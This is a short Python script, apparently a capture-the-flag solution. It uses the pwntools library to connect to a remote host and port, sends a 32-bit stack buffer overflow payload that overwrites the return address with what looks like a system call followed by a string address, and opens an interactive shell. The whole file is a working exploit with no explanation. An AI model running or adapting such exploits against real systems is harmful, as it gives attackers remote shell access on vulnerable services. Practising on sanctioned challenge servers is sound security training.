from pwn import *

io = remote("61.147.171.35",63920)

payload = b'A'*(0x88+4) + p32(0x08048320) +p32(0) +p32(0x0804A024)

io.sendline(payload)

io.interactive()
